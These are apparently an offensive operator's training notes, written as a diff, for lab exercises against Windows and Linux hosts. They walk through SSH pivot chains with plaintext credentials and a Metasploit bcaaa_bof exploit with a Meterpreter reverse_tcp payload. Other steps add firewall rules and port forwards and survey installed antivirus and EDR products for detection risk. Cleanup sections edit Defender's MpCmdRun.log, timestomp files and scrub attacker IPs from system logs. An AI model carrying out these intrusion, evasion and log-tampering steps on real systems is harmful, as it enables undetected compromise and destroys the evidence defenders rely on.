+	run multicommand -cl 'sc query winrm'
+	run multicommand -cl 'sc query wecsvc'
+	
+#running != sending logs though. verify if listening for conns or await remote admin collection 
+run multicommand -cl 'cmd /c winrm get winrm/config' 
+	AllowRemoteAccess = true 
+run multicommand -cl 'cmd /c winrm enumerate winrm/config/listener'
+	Enabled = True 
+	
+# check FW rules if winRM ports enabled (5985 5986)
+run multicommand -cl 'netsh advfirewall firewall show rule name="Windows Remote Management (HTTP-In)"'
+	Enabled on all profiles, 5985
+run multicommand -cl 'netsh advfirewall firewall show rule name="Windows Remote Management (HTTPS-In)"'
+
+# forwarder vs collector? typically common workstation = forwarder 
+dir 'c:\windows\system32\winevt' # check 'Logs' modify time 
+- if recently written to, probably collector. otherwise forwarder 
+
+}
+
+#22 - deviceguard, credguard, bitlocker,trustedboot, ELAM, measuredboot {
+
+# remember Powershell use is all logged 
+
+# DeviceGuard
+reg enumkey -k 'HKLM\system\currentcontrolset\control\deviceguard' 
+	-  If the values EnableVirtualizationBasedSecurity and RequirePlatformSecurityFeatures are not present or are not set to "1" then, DeviceGuard is not enabled.
+
+# LSA  ^ same keys as guard check PLUS 
+reg enumkey -k 'HKLM\system\currentcontrolset\control\LSA'
+reg queryval -k 'HKLM\system\currentcontrolset\control\LSA' -v LsaCfgFlags
+	^is not present or set to 0, the CredentialGuard is not enabled.
+
+---- via powershell 
+load powershell
+#bitlocker 
+powershell_execute "manage-bde -status"
+
+
+# trustedboot/elam 
+powershell_execute "Confirm-SecureBootUEFI"
+	- "Cmdlet not supported on this platform" = not enabled. if true, is supported 
+	
+# measuredboot 
+- if UEFI and Trustedboot not running & enabled, no measured boot 
+}
+
+#23. Windows 10 black/whitelisting in Applocker {
+
+# check if white/blacklisting  
+reg enumkey -k 'HKLM\software\policies\microsoft\windows\safer\codeidentifiers'
+	- query individual keys/values 
+reg enumkey -k 'HKLM\software\policies\microsoft\windows\safer\codeidentifiers\262144\Paths'
+reg queryval -k 'HKLM\software\policies\microsoft\windows\safer\codeidentifiers' -v ExecutableTypes 
+reg queryval -k 'HKLM\software\policies\microsoft\windows\safer\codeidentifiers' -v DefaultLevel 
+reg queryval -k 'HKLM\software\policies\microsoft\windows\safer\codeidentifiers' -v PolicyScope 
+
+
+
+# applocker 
+run multicommand -cl 'sc query AppIDSvc'
+powershell 
+Get-AppLockerPolicy -Effective -Xml | Set-Content ('c:\windows\temp\applocker.xml')
+ctrl c
+
+download 'c:\windows\temp\applocker.xml' /tmp
+https://learn.microsoft.com/pt-pt/previous-versions/windows/server/cc786941(v=ws.10)?redirectedfrom=MSDN
+
+
+}
+
+#24. CLEAN UP {
+
+# if connection/session died during conn, may have been logged in MpCmdRun.log. If so, clean out 
+	Since the MpCmdRun.log is a UTF-16 encoded file, you will need to download the file to your 1337h4x host to convert it to UTF-8, clean it and convert it back to UTF-16 before uploading and overwriting the original file.
+
+meterpreter>
+run multicommand -cl 'cmd /c type MpCmdRun.log | findstr infected' 
+	# if string, continue
+download 'c:\windows\temp\mpcmprun.log' /tmp
+
+ops$ 
+wc -l MpCmdRun.log # (Get the number of lines in original file)
+iconv -f UTF-16 -t UTF-8 MpCmdRun.log | grep -v "infected" > newlog.log # (Convert format and remove the offending lines)
+wc -l newlog.log # (Verify the correct number of lines were removed).  can also grep the file to verify the offending terms are gone.
+iconv -f UTF-8 -t UTF-16 newlog.log > MpCmdRun.log.1 # (Convert the clean file to UTF-16)
+
+meterpreter>
+ls MpCmdRun.log # Get the file time so you can set the correct after uploading the clean file.
+upload /root/MpCmdRun.log.1 MpCmdRun.log
+timestomp -m "04/24/2018 10:37:53" MpCmdRun.log # Set the time to the previously noted file time.
+ls MpCmdRun.log # Verify the time change is correct.
+
+# don't need to stop the service to overwrite and time stamp the MpCmdRun.log file
+Get the time of the file before overwriting it by running ls MpCmdRun.log
+
+}
+
+}
+
+
+}
+
+``` 4. LOGS/ EXITS ``` {
+
+}
+
+
+}
+
+# Exercise 3. ESP Discovery and Triage {
+Ops Box: 1337h4x.ops.local
+> Jump 1: ras.fatdeer.lab (EXT IP: 198.18.30.5), access via SSH port 22, Creds: remoteuser / remote
+>> Jump 2: web.drytortugas.lab (EXT IP: 192.0.2.80, INT IP: 172.17.10.80), access via SSH port 22, Creds: www / Webific@ti0n
+>>> Target 1: duval.drytortugas.lab, (IP: 192.168.255.10), Windows 7, access via bcaaa_bof exploit
+>>>> Target 2: whitehead.drytortugas.lab (IP: 192.168.255.11), Windows 7, access via bcaaa_bof exploit
+>>> Target 3: front.drytortugas.lab (IP: 192.168.255.12), access via SSH port 22, Creds: aram / BlackList root / Reddingt0n
+
+
+#J1
+ssh -x -v -p22 remoteuser@198.18.30.5 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L2222:192.0.2.80:22
+remote
+
+#J2 
+ssh -x -v -p2222 www@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L16102:192.168.255.10:16102 -R4444:127.0.0.1:4444 -R1337:127.0.0.1:1337
+Webific@ti0n
+	# T3 LPF 
+	~+C 
+	-L2223:192.168.255.12:22
+
+
+# T1 {
+
+``` 1. Connection/ Exploit ``` {
+=========================================================================================================
+# bcaaa_bof { 
+use windows/misc/bcaaa_bof 
+set payload windows/meterpreter/reverse_tcp
+set RHOSTS 127.0.0.1 
+set RPORT 16102 (default)
+set LHOST 172.17.10.80 # internal IP 
+set LPORT 4444 (default)
+show options 
+
+
+# LOGS - APPLICATION 
+1001 - INFO // mayne 
+1003 - INFO // maybe 
+
+2207 - ERROR <- expect this 
+}
+
+========================================================================================================= }
+
+``` 2. Survey ``` {
+=========================================================================================================
+SOPHOS - DUVAL\Capt Tony - user 
+'C:\Program Files (x86)\Sophos\'
+
+
+'C:\Program Files (x86)\Sophos\\Sophos Network Threat Protection\bin\SntpService.exe'
+'C:\Program Files (x86)\Sophos\\Sophos Anti-Virus\SAVAdminService.exe'
+'C:\Program Files (x86)\Sophos\\Sophos Anti-Virus\SavService.exe' 
+'C:\Program Files (x86)\Sophos\\AutoUpdate\ALsvc.exe'  2100/524 
+'C:\Program Files (x86)\Sophos\\Management Communications System\Endpoint\McsAgent.exe' 2100/524 
+'C:\Program Files (x86)\Sophos\\Management Communications System\Endpoint\McsClient.exe' 2224/524
+'C:\Program Files (x86)\Sophos\Sophos System Protection\ssp.exe' 2436/524
+'C:\Program Files (x86)\Sophos\Sophos Anti-Virus\Web Control\swc_service.exe' 2532/544 
+'C:\Program Files (x86)\Sophos\AutoUpdate\ALMon.exe' -  4172/4092
+
+2x procs for HITMANPRO - included in Sophos
+C:\Program Files (x86)\HitmanPro.Alert\hmpalert.exe 1348/708, 708/524 
+
+========================================================================================================= }
+
+# SOPHOS ESP triage {
+
+// reg location:
+	reg enumkey -k "HKLM\Software\Sophos\"
+
+# Determine the Product Name
+run post/windows/gather/enum_applications
+	Sophos 
+	
+# Determine the Specific version of the product/software
+dir 'c:\windows\temp' -t 
+	cat (c:\windows\temp\Sophos Anti-virus Major Install Log_...txt and c:\programdata\sophos\autoupdate\data\status\SophosUpdateStatus.xml)
+		AV Product Version: 10.7.6.117
+		
+	cat 'c:\programdata\sophos\sophos anti-virus\logs\SAV_20180509.txt' // detection engine 3.70.2
+
+# Determine the date the latest signature were installed
+dir 'c:\programdata\sophos\autoupdate\data\warehouse' -t
+	--- latest file time = Signature Date
+
+# Determine the security capabilities of the installed product (real time scan, scheduled scans, spyware/adware detection, email scan, heuristic detection, signature detection, cloud or sand boxing, memory scans etc.) 
+- realtime antivirus
+- predicitive AI threat detection 
+- parental website filtering 
+- web protection 
+- remtoe antivirus management 
+- ransomware sec 
+-advaced websec and banking protection 
+- privacy protection 
+- advaned malware scan/clean 
+- AMSI integration (scripting attacksthat use obfuscation/encryption/run in memory
+
+# You may be able to run handle.exe or handle64.exe (depending) against the ESP related processes to gather info such as the location of logs that are being written to.
+
+# Determine when the last scan occurred and the next scan will occur
+dir 'c:\programdata\sophos\home clean\logs' 
+	cat 'c:\programdata\sophos\home clean\logs\XXX.log'
+	
+	# if 64bit session 
+	reg queryval -k 'HKLM\Software\SophosHomeClean\' -v LastScan
+
+# next Scan 
+run multicommand -cl 'schtasks /query' -f /tmp/schtasks
+	--- nothing 
+***product does not have a scheduled scan capability*** - sophos community support forum 
+
+# Determine if the product logs locally, remotely or both
+dir 'c:\users\<user>\appdata\local\temp\sdu' # if archived. otherwise, check xml in parent directory
+	download 'c:\program files (x86)\Sophos\Sophos Diagnostic Utility\sduconfig.xml' /tmp
+ 
+https://support.home.sophos.com/hc/en-us/articles/115005565806?section=Windows%20computers
+
+- logs locally by default. CAN send lgos remotely via SDU, but must be manually activated. 
+- since product is configured via Remote Web Management, limited info (alerts) are sent via management console 
+	
+# Determine if the product has the ability to ship off detected malware remotely and if that capability is enabled
+search -f *SAV*
+cat 'c:\users\all users\sophos\sophos Anti-virus\logs\SAV_20180509.txt'
+	'Live Protection is enabled'
+# Determine the location of any quarantine location on the local host
+run multicommand -cl "cmd /c dir c:\\quarantine /S /A:D"
+
+	'c:\programdata\microsoft\microsoft antimalware\quarantine'
+	'c:\programdata\microsoft\windows defender\quarantine'
+	'c:\users\all users\microsoft\microsoft antimalware\quarantine'
+	'c:\users\all users\microsoft\windows defender\quarantine'
+	
+--- sophos does not have a quarantine folder. potential malware is sent to web based cnetral managament console, then user can choose to remove/restore the file 
+
+# Determine if your activities have been detected by the ESP
+
+}
+
+
+
+
+``` 3. Actions ``` {
+=========================================================================================================
+# add FW rule to T2 exploit 
+run multicommand -cl 'netsh advfirewall firewall add rule name=g3r0g3r0 dir=in localport=3389 action=allow protocol=TCP'
+
+# T2 portfwds 
+portfwd add -L 127.0.0.1 -l 16103 -r 192.168.255.11 -p 16102
+portfwd add -R -L 127.0.0.1 -l 3389 -p 3389
+
+========================================================================================================= }
+
+``` 4. LOGS/ EXITS ``` {
+=========================================================================================================
+run multicommand -cl 'netsh advfirewall firewall del rule name=g3r0g3r0'
+
+
+
+========================================================================================================= }
+
+}
+
+# T2 {
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+``` 1. Connection/ Exploit ``` {
+=========================================================================================================
+# bcaaa_bof { 
+use windows/misc/bcaaa_bof 
+set payload windows/meterpreter/reverse_tcp
+set RHOSTS 127.0.0.1 
+set RPORT 16103 # T2 custom 
+set LHOST 192.168.255.10 # T1 
+set LPORT 3389 # T1
+show options 
+
+
+# LOGS - APPLICATION 
+1001 - INFO // mayne 
+1003 - INFO // maybe 
+
+2207 - ERROR <- expect this 
+
+========================================================================================================= }
+}
+
+``` 2. Survey ``` {
+=========================================================================================================
+system auditing is on 
+
+*migrate to 64
+
+C:\Program Files (x86)\Baidu Security\Baidu Antivirus\BavTray
+C:\Program Files (x86)\Baidu Security\Baidu Antivirus\BavSvc.exe 
+C:\Program Files (x86)\Baidu Security\Baidu Antivirus\BHipsSvc.exe
+C:\Program Files (x86)\Baidu Security\Baidu Antivirus\ReportCommRetry.exe
+C:\Program Files (x86)\Baidu Security\Baidu Antivlrus\bavhm.exe
+
+
+========================================================================================================= }
+
+# Baidu Security - ESP triage {
+
+# Determine the Product Name
+dir 'c:\program files (x86)\Baidu Security\Baidu Antivirus\i18n\3082\AboutUs\skin'
+	Baidu Antivirus
+
+# Determine the Specific version of the product/scan engine/ signatures
+search -f *config.ini*
+search -f *version.xml*
+download 'C:\Program Files (x86)\Baidu Security\Baidu Antivirus\config.ini' /tmp 
+download 'C:\Program Files (x86)\Baidu Security\Baidu Antivirus\version.xml' /tmp
+	dos2unix X X 
+
+vim version.xml 
+	Program Version - 5.0.3.84333
+	
+vim config.ini
+	AvEngineVersion=8.3.30.16
+	AvVDFVersion=7.11.224.28 # <--- signatures version 
+	
+# Determine the date the latest signature were installed
+vim config.ini
+	AvUpdateDate=2015/04/14 11:44:07
+
+# Determine the security capabilities of the installed product (real time scan, scheduled scans, spyware/adware detection, email scan, heuristic detection, signature detection, cloud or sand boxing, memory scans etc.) 
+google-fu --- https://www.pcmag.com/reviews/baidu-antivirus
+launch quick/full/custom scan
+cloud file scanner 
+malicious download blocking (mediocre)
+local malware blocking (poor)
+"Antiphishing" (absent)
+
+# You may be able to run handle.exe or handle64.exe (depending) against the ESP related processes to gather info such as the location of logs that are being written to.
+
+# Determine when the last scan occurred and the next scan will occur
+cat 'C:\Users\All users\Baidu\Antivirus\userconfig.ini'
+	date -d '@X'
+		1428940860 = Mon 13 Apr 2015 12:01:00 PM EDT 
+		
+run multicommand -cl 'schtasks /query'
+	Baidu Antivirus Update (Next Run Time) 7/30/2023 6:00:00 PM Ready 
+
+# Determine if the product logs locally, remotely or both
+vim config.ini 
+	[setting]
+	CreateLog=1
+	LogLevel=12
+	KeepLocalCopy=1 
+		so yes
+
+# Determine if the product has the ability to ship off detected malware remotely and if that capability is enabled
+vim config.ini 
+	[EngineOption]
+	AutoUpload=0  = off 
+
+# Determine the location of any quarantine location on the local host
+run multicommand -cl "cmd /c dir c:\\qv /S /A:D"
+dir 'c:\Program Files (x86)\Baidu Security\Baidu Antivirus\qv'
+	- empty 
+
+# Determine if your activities have been detected by the ESP
+SYSTEM 1116 and 1117 
+run multicommand -cl 'wevtutil qe SYSTEM "/q:*[System [(EventID=1116)]]" /rd:true /f:text'
+run multicommand -cl 'wevtutil qe SYSTEM "/q:*[System [(EventID=1117)]]" /rd:true /f:text'
+	nothing 
+
+APPLICATION (2207) from EXPLOIT 
+run multicommand -cl 'wevtutil qe APPLICATION "/q:*[System [(EventID=2207)]]" /rd:true /f:text' 
+	YES, logged exploit 
+	
+# Check WER sub-directory for residue
+dir 'C:\users\all users\microsoft\windows\WER\ReportArchive'
+dir 'C:\users\all users\microsoft\windows\WER\ReportQueue'
+
+# check fw log 
+run multicommand -cl 'cmd /c findstr /c:"192.168.255.10" c:/windows/system32/logfiles/firewall/pfirewall.log
+	pfirewall.log doesn't exist 
+}
+
+
+``` 3. Actions ``` {
+=========================================================================================================
+
+========================================================================================================= }
+
+``` 4. LOGS/ EXITS ``` {
+=========================================================================================================
+
+========================================================================================================= }
+
+}
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+ 
+
+# T3 {
+=========================================================================================================
+
+
+``` 1. Connection/ Exploit ``` {
+---------------------------------------------------------------------------------------------------------
+ssh -x -v -p2223 aram@localhost -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+aram / BlackList 
+root / Reddingt0n
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 2. Survey ``` {
+---------------------------------------------------------------------------------------------------------
+
+rysylogd 
+/usr/bin/freshclam -d 
+/usr/sbin/clamd - 719 
+/usr/sbin/amavisd-new 
+
+sadiq not in lastlog?
+
+clamd/clam-freshclam services enabled 
+amavis-mc enabled
+
+# clamav ESP triage {
+
+# Associated Files 
+// list installed packages related to clam 
+apt list --installed | grep clam
+
+// list specific files in those packages 
+dpkg-query -L clamav
+dpkg-query -L clamav-freshclam
+dpkg-query -L clamscan
+
+# Config Files 
+ls -al /etc/clamav
+cat /etc/clamav/clamd.conf # controls how AV works 
+	LogFile 
+cat /etc/clamav/freshclam.conf # controls updates
+	UpdateLogFile
+	Checks # how many times in 24 hours client checks for updates
+
+// review contents of dir and timestamps of note
+
+# Startup Scripts and Services 
+- clamav places 2 scripts in init.d (or installs 2 services pending on OS)
+*freshclam service: chekcs for updates as shown above 
+*clamav-daemon - allows for automated scanning if supported by other programs (email, etc.)
+	- doesn't perform custom scanning out of the box. typically done by admin /cron script 
+
+cat /etc/crontab
+for user in $(cut -f1 -d: /etc/passwd); do echo "###### $user crontab is:"; cat /var/spool/cron/{crontabs/$user,$user} 2>/dev/null; done
+ls -latrd /etc/cron.*/*
+	/etc/cron.weekly/scan
+
+# Log Files 
+ls -latr /var/log/clamav/
+	# controlled via 
+ls -ltar /etc/logrotate.d/
+
+
+}
+
+# rkhunter / chrootkit ESP triage {
+
+security monitoring against malware/rootkits
+
+# 1. Associated Files 
+apt list --installed | grep rkhunter
+apt list --installed | grep chkrootkit
+
+dpkg-query -L rkhunter
+dpkg-query -L chkrootkit
+
+
+# 2. Config Files 
+cat /etc/rkhunter.conf
+	- lines 255-267 define syslog useage. NOT enabled by default. 
+cat /etc/chkrootkit.conf
+
+# 3. Startup Scripts and Services 
+cat /etc/crontab
+for user in $(cut -f1 -d: /etc/passwd); do echo "###### $user crontab is:"; cat /var/spool/cron/{crontabs/$user,$user} 2>/dev/null; done
+ls -latrd /etc/cron.*/*
+	/etc/cron.weekly/rkhunter 
+	/etc/cron.daily/rkhunter
+	/etc/cron.daily/chkrootkit
+
+# 4. Log Files 
+ls -latr /var/log
+	cat /var/log/rkhunter.log
+
+ls -ltar /var/log/chkrootkit
+
+}
+
+# fail2ban {
+
+# 1. Associated Files 
+dpkg-query -L fail2ban
+
+# 2. Config Files 
+ls -ltar /etc/fail2ban 	
+	log location, number of log attempts to flag, allowed amount of time between attempts to allow, the various filters program will utilize to recognize attacks against the system
+
+# 3. Startup Scripts and Services 
+
+# 4. Log Files 
+
+
+}
+
+# logcheck {
+- scrapes logfiles for 'dirty words' & emails rport to sysadmin 
+	- what are dirty words? when does program run? 
+
+
+# 1. Associated Files 
+dpkg -L logcheck
+
+/usr/sbin/logcheck 
+cat /usr/sbin/logcheck # to learn it
+
+
+# 2. Config Files 
+ls -latr /etc/logcheck 
+
+# 3. Startup Scripts and Services
+/etc/cron.d/logcheck  
+
+# 4. Log Files 
+
+///////////
+#determine report level 
+grep "REPORTLEVEL" /etc/logcheck/logcheck.conf 
+	ls -ltar /etc/logcheck/ignore.d.____ / # types of log events noted under this specific report level 
+
+# logs checked by logcheck
+cat /etc/logcheck/logcheck.logfiles
+
+}
+
+
+
+--------------------------------------------------------------------------------------------------------- }
+
+
+
+``` 3. Actions ``` {
+---------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 4. LOGS/ EXITS ``` {
+---------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------- }
+
+=========================================================================================================
+}
+
+}
+
+
+
+}
+
+``` 3.3 Surveys and Risk Analysis ``` {
+ # why survey & tradecraft principles 
+- identify system characteristics, evaluate suitability for ops, risk analysis 
+
+Never connect directly from your ops network to the target network
+sUnderstand your Op Plan before you begin your operation
+Be familliar with the particulars of commands
+Stealth is a key attribute to good OPSEC
+Always use encrypted communications channels when performing an operation
+Be cognizant of potential spikes in bandwidth at remote locations as a result of your activities
+Limit the number of tools you upload to a target
+Ask Questions if you don't know the answer
+
+
+
+}
+
+
+}
+
+
+
+
+
+
+
+
+
+# <WORK> {
+
+
+
+# J1 
+
+
+# J2 
+
+
+
+# T1 {
+=========================================================================================================
+``` 1. Connection/ Exploit ``` {
+---------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 2. Survey ``` {
+---------------------------------------------------------------------------------------------------------
+
+# netstat 
+
+# ps 
+
+# misc
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+# Malware 
+search -f *each-process* (verify if duplicates)
+
+# ESP
+
+# Logs 
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 3. Actions ``` {
+---------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 4. LOGS/ EXITS ``` {
+---------------------------------------------------------------------------------------------------------
+
+++++ always correlate timestamps! ++++
+---- ALWAYS exit extra meterpreter sessions b4 cleaning, and CHECK for exits ---- 
+
+# nix common logs {
+egrep -r '' /var/log 
+
+/var/log/auth.log
+	# ^ clean IP and systemd session creation
+	/var/log/secure
+/var/log/syslog 
+	# ^ needs more than IP to clean
+/var/log/kern.log
+	# typically logs <IP> and <systemd> slices. --- use timestamps, systemd includes [1] and [RHN] 'reached targets'
+/var/log/audit/audit.log 
+/var/log/smb/log.smbd ***
+	e.g. '16:09:26|172.17.10.80' /var/log/samba/log.smbd
+	grep "<EXPLOIT TIME>|<IP>"
+}
+
+egrep -r '<IPs>' /var/log # FINAL CHECK !
+
+
+# win common logs {
+run multicommand -cl 'wevtutil qe SYSTEM /c:15 /rd:true /f:text'
+run multicommand -cl 'wevtutil qe SECURITY /c:15 /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe APPLICATION /c:15 /rd:true /f:text'
+run multicommand -cl 'wevtutil qe "Windows Powershell" /c:15 /rd:true /f:text'
+	
+# query related SYSTEM/SEC/POWERSHELL IDs 
+run multicommand -cl 'wevtutil qe SYSTEM "/q:*[System [(EventID=7009)]]" /rd:true /f:text' 
+
+
+}
+
+
+
+# FINAL PRESENCE CHECK 
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<TIME> -type f -print0 | xargs -0 ls -latr 
+
+--------------------------------------------------------------------------------------------------------- }
+========================================================================================================= }
+
+
+
+# T2 {
+=========================================================================================================
+``` 1. Connection/ Exploit ``` {
+---------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 2. Survey ``` {
+---------------------------------------------------------------------------------------------------------
+
+# netstat 
+
+# ps 
+
+# misc
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+# Malware 
+search -f *each-process* (verify if duplicates)
+
+# ESP
+
+# Logs 
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 3. Actions ``` {
+---------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 4. LOGS/ EXITS ``` {
+---------------------------------------------------------------------------------------------------------
+
+++++ always correlate timestamps! ++++
+---- ALWAYS exit extra meterpreter sessions b4 cleaning, and CHECK for exits ---- 
+
+# nix common logs {
+egrep -r '' /var/log 
+
+/var/log/auth.log
+	# ^ clean IP and systemd session creation
+	/var/log/secure
+/var/log/syslog 
+	# ^ needs more than IP to clean
+/var/log/kern.log
+	# typically logs <IP> and <systemd> slices. --- use timestamps, systemd includes [1] and [RHN] 'reached targets'
+/var/log/audit/audit.log 
+/var/log/smb/log.smbd ***
+	e.g. '16:09:26|172.17.10.80' /var/log/samba/log.smbd
+	grep "<EXPLOIT TIME>|<IP>"
+}
+
+egrep -r '<IPs>' /var/log # FINAL CHECK !
+
+
+# win common logs {
+run multicommand -cl 'wevtutil qe SYSTEM /c:15 /rd:true /f:text'
+run multicommand -cl 'wevtutil qe SECURITY /c:15 /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe APPLICATION /c:15 /rd:true /f:text'
+run multicommand -cl 'wevtutil qe "Windows Powershell" /c:15 /rd:true /f:text'
+	
+# query related SYSTEM/SEC/POWERSHELL IDs 
+run multicommand -cl 'wevtutil qe SYSTEM "/q:*[System [(EventID=7009)]]" /rd:true /f:text' 
+
+
+}
+
+
+
+
+# FINAL PRESENCE CHECK 
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<TIME> -type f -print0 | xargs -0 ls -latr 
+
+--------------------------------------------------------------------------------------------------------- }
+========================================================================================================= }
+
+
+
+# T3 {
+=========================================================================================================
+``` 1. Connection/ Exploit ``` {
+---------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 2. Survey ``` {
+---------------------------------------------------------------------------------------------------------
+
+# netstat 
+
+# ps 
+
+# misc
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+# Malware 
+search -f *each-process* (verify if duplicates)
+
+# ESP
+
+# Logs 
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 3. Actions ``` {
+---------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 4. LOGS/ EXITS ``` {
+---------------------------------------------------------------------------------------------------------
+
+++++ always correlate timestamps! ++++
+---- ALWAYS exit extra meterpreter sessions b4 cleaning, and CHECK for exits ---- 
+
+# nix common logs {
+egrep -r '' /var/log 
+
+/var/log/auth.log
+	# ^ clean IP and systemd session creation
+	/var/log/secure
+/var/log/syslog 
+	# ^ needs more than IP to clean
+/var/log/kern.log
+	# typically logs <IP> and <systemd> slices. --- use timestamps, systemd includes [1] and [RHN] 'reached targets'
+/var/log/audit/audit.log 
+/var/log/smb/log.smbd ***
+	e.g. '16:09:26|172.17.10.80' /var/log/samba/log.smbd
+	grep "<EXPLOIT TIME>|<IP>"
+}
+
+egrep -r '<IPs>' /var/log # FINAL CHECK !
+
+
+# win common logs {
+run multicommand -cl 'wevtutil qe SYSTEM /c:15 /rd:true /f:text'
+run multicommand -cl 'wevtutil qe SECURITY /c:15 /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe APPLICATION /c:15 /rd:true /f:text'
+run multicommand -cl 'wevtutil qe "Windows Powershell" /c:15 /rd:true /f:text'
+	
+# query related SYSTEM/SEC/POWERSHELL IDs 
+run multicommand -cl 'wevtutil qe SYSTEM "/q:*[System [(EventID=7009)]]" /rd:true /f:text' 
+
+
+}
+
+
+
+# FINAL PRESENCE CHECK 
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<TIME> -type f -print0 | xargs -0 ls -latr 
+
+--------------------------------------------------------------------------------------------------------- }
+========================================================================================================= }
+
+
+}
+
+# T<X> {
+=========================================================================================================
+``` 1. Connection/ Exploit ``` {
+---------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 2. Survey ``` {
+---------------------------------------------------------------------------------------------------------
+
+# netstat 
+
+# ps 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+### MISC ###
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+# Malware 
+search -f *process/filename* (verify if duplicates)
+find / -iname *filename* 2>/dev/null
+	
+# ESP
+
+# Logs 
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 3. Actions ``` {
+---------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------- }
+
+``` 4. LOGS/ EXITS ``` {
+---------------------------------------------------------------------------------------------------------
+
+++++ always correlate timestamps! ++++
+---- ALWAYS exit extra meterpreter sessions b4 cleaning, and CHECK for exits ---- 
+
+# nix common logs {
+egrep -r '' /var/log 
+
+/var/log/auth.log
+	# ^ clean IP and systemd session creation
+	/var/log/secure
+/var/log/syslog 
+	# ^ needs more than IP to clean
+/var/log/kern.log
+	# typically logs <IP> and <systemd> slices. --- use timestamps, systemd includes [1] and [RHN] 'reached targets'
+/var/log/audit/audit.log 
+/var/log/smb/log.smbd ***
+	e.g. '16:09:26|172.17.10.80' /var/log/samba/log.smbd
+	grep "<EXPLOIT TIME>|<IP>"
+}
+
+egrep -r '<IPs>' /var/log # FINAL CHECK !
+
+# win common logs {
+run multicommand -cl 'wevtutil qe SYSTEM /c:15 /rd:true /f:text'
+run multicommand -cl 'wevtutil qe SECURITY /c:15 /rd:true /f:text' 
+run multicommand -cl 'wevtutil qe APPLICATION /c:15 /rd:true /f:text'
+run multicommand -cl 'wevtutil qe "Windows Powershell" /c:15 /rd:true /f:text'
+	
+# query related SYSTEM/SEC/POWERSHELL IDs 
+run multicommand -cl 'wevtutil qe SYSTEM "/q:*[System [(EventID=7009)]]" /rd:true /f:text' 
+
+
+}
+
+
+
+# FINAL PRESENCE CHECK 
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<TIME> -type f -print0 | xargs -0 ls -latr 
+
+
+--------------------------------------------------------------------------------------------------------- }
+========================================================================================================= }
+
+# save {
+
+# precise fw log find 
+run multicommand -cl 'cmd /c findstr /c:"exact phrase to match" c:\path\to\firewall.log'
+
+# iptables junk-free list (only show chain rules) 
+iptables -vnL | grep -B2 "all\|icmp\|tcp\|udp\|esp\|ah\|sctp\|mh" | less
+
+``` misc notes ``` 
+- typically only need to use exploit multi handler to manually connect to bind shell 
+- otherwise, just set up RPF for reverse connection. config payload, meterpreter will do the rest
+
+}
